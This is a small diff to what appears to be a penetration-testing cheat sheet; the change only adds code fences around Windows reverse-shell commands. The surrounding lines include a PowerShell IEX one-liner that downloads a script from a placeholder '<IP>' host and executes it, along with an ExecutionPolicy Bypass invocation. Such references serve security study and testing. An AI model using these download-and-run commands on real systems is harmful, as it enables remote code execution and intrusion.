@@ -30,7 +30,7 @@ python -m SimpleHTTPServer 80
     kill -9 PID   
 
 #### In reverse shell - Windows
-
+```shell
 powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
 
 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"
@@ -38,7 +38,7 @@ powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<scrip
 powershell full path:
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe
-
+```
 #### Non-interactive execute powershell file
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
